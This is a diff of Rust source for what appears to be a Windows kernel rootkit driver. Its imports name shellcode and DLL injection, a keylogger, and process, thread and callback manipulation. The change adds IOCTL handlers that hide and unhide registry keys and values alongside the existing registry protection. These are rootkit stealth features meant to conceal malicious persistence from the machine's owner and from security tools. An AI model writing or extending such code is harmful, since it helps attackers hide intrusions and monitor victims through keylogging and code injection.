@@ -1,9 +1,9 @@
 use {
     crate::{
-        *, 
-        callbacks::{Callback, CallbackRegistry, CallbackOb, CallbackList}, 
-        driver::Driver, injection::{InjectionShellcode, InjectionDLL}, keylogger::set_keylogger_state, 
-        module::Module, process::Process, thread::Thread
+        callbacks::{Callback, CallbackList, CallbackOb, CallbackRegistry}, 
+        driver::Driver, injection::{InjectionDLL, InjectionShellcode}, 
+        keylogger::set_keylogger_state, module::Module, 
+        process::Process, thread::Thread, *
     }, 
     alloc::boxed::Box, 
     core::mem::size_of, 
@@ -16,14 +16,13 @@ use {
     wdk_sys::{IO_STACK_LOCATION, IRP, NTSTATUS} 
 };
 
-
 #[cfg(not(feature = "mapper"))]
 use {
     crate::{
         process::add_remove_process_toggle,
         thread::add_remove_thread_toggle,
         handle_registry,
-        registry::Registry
+        registry::{Registry, utils::KeyListType}
     },
     shared::structs::{ProcessProtection, ThreadProtection, TargetRegistry},
 };
@@ -191,14 +190,28 @@ lazy_static! {
         
             ioctls.insert(IOCTL_REGISTRY_PROTECTION_VALUE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
                 log::info!("Received IOCTL_REGISTRY_PROTECTION_VALUE");
-                let status = unsafe { handle_registry!(stack, Registry::add_remove_registry_toggle, TargetRegistry) };
+                let status = unsafe { handle_registry!(stack, Registry::add_remove_registry_toggle, TargetRegistry, KeyListType::Protect) };
+                unsafe { (*irp).IoStatus.Information = 0 };
+                status
+            }) as IoctlHandler);
+            
+            ioctls.insert(IOCTL_REGISTRY_PROTECTION_KEY, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
+                log::info!("Received IOCTL_REGISTRY_PROTECTION_KEY");
+                let status = unsafe { handle_registry!(stack, Registry::add_remove_key_toggle, TargetRegistry, KeyListType::Protect) };
                 unsafe { (*irp).IoStatus.Information = 0 };
                 status
             }) as IoctlHandler);
 
-            ioctls.insert(IOCTL_REGISTRY_PROTECTION_KEY, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
-                log::info!("Received IOCTL_REGISTRY_PROTECTION_KEY");
-                let status = unsafe { handle_registry!(stack, Registry::add_remove_key_toggle, TargetRegistry) };
+            ioctls.insert(IOCTL_HIDE_UNHIDE_KEY, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
+                log::info!("Received IOCTL_HIDE_UNHIDE_KEY");
+                let status = unsafe { handle_registry!(stack, Registry::add_remove_key_toggle, TargetRegistry, KeyListType::Hide) };
+                unsafe { (*irp).IoStatus.Information = 0 };
+                status
+            }) as IoctlHandler);
+
+            ioctls.insert(IOCTL_HIDE_UNHIDE_VALUE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
+                log::info!("Received IOCTL_HIDE_UNHIDE_VALUE");
+                let status = unsafe { handle_registry!(stack, Registry::add_remove_registry_toggle, TargetRegistry, KeyListType::Hide) };
                 unsafe { (*irp).IoStatus.Information = 0 };
                 status
             }) as IoctlHandler);
